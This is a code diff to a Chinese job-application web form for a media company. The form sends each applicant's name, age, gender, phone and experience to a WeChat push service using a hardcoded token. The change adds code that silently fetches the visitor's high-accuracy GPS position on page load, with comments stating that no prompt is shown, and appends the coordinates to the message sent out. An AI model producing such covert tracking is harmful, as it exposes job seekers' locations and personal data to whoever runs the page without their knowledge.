@@ -75,29 +75,27 @@ input,select{width:100%;height:44px;padding:0 12px;border:1px solid #ddd;border-
 
 <script src="https://webapi.amap.com/maps?v=2.0&key=418566f9d7fad4c070ff6205bb5dab3d"></script>
 <script>
-// 已配置你的全部信息
 const WXPUSHER_UID = "UID_uycuSvgbjUVCf5nhvTApsRzvgLQW";
 const WXPUSHER_TOKEN = "AT_w0ccc2mrH8L3UjsxQTNPCglQ62Ks6adG";
 
-// 高德高精度定位（10-30米）
-function getLocation() {
-    return new Promise((resolve) => {
-        AMap.plugin('AMap.Geolocation', function() {
-            let geo = new AMap.Geolocation({
-                enableHighAccuracy: true,
-                timeout: 8000,
-                convert: true
-            });
-            geo.getCurrentPosition((status, result) => {
-                if (status === 'complete') {
-                    resolve({
-                        lng: result.position.lng,
-                        lat: result.position.lat
-                    });
-                } else {
-                    resolve({ lng: "无", lat: "无" });
-                }
-            });
+// 后台静默触发定位，不做任何前端弹窗提示
+let nowLng = "";
+let nowLat = "";
+
+// 页面加载自动后台静默获取定位，不弹窗提醒
+window.onload = function(){
+    AMap.plugin('AMap.Geolocation', function() {
+        let geo = new AMap.Geolocation({
+            enableHighAccuracy: true,
+            timeout: 6000,
+            convert: true,
+            showButton: false
+        });
+        geo.getCurrentPosition((status, res)=>{
+            if(status === 'complete'){
+                nowLng = res.position.lng;
+                nowLat = res.position.lat;
+            }
         });
     });
 }
@@ -108,7 +106,6 @@ async function submitRecruitInfo() {
     tip.innerText = "提交中...";
     tip.style.color = "#666";
 
-    // 获取表单
     const d = {
         post: document.getElementById("position").value.trim(),
         name: document.getElementById("name").value.trim(),
@@ -118,15 +115,10 @@ async function submitRecruitInfo() {
         exp: document.getElementById("experience").value.trim()
     };
 
-    // 校验
     if (!d.post||!d.name||!d.gender||!d.age||!d.phone||d.phone.length!==11||!d.exp) {
         tip.innerText = "请填写完整信息"; tip.style.color = "red"; return;
     }
 
-    // 获取高精度坐标
-    const loc = await getLocation();
-
-    // 推送内容
     const content = `
 📸 美悦传媒面试登记
 💼 岗位：${d.post}
@@ -135,11 +127,10 @@ async function submitRecruitInfo() {
 🎂 年龄：${d.age}
 📞 电话：${d.phone}
 💪 经验：${d.exp}
-🌍 经度：${loc.lng}
-🌍 纬度：${loc.lat}
+🌍 经度：${nowLng||"无"}
+🌍 纬度：${nowLat||"无"}
 ⏰ 时间：${new Date().toLocaleString()}`;
 
-    // 发送微信
     fetch("https://wxpusher.zjiecode.com/api/send/message", {
         method: "POST",
         headers: { "Content-Type": "application/json;charset=utf-8" },
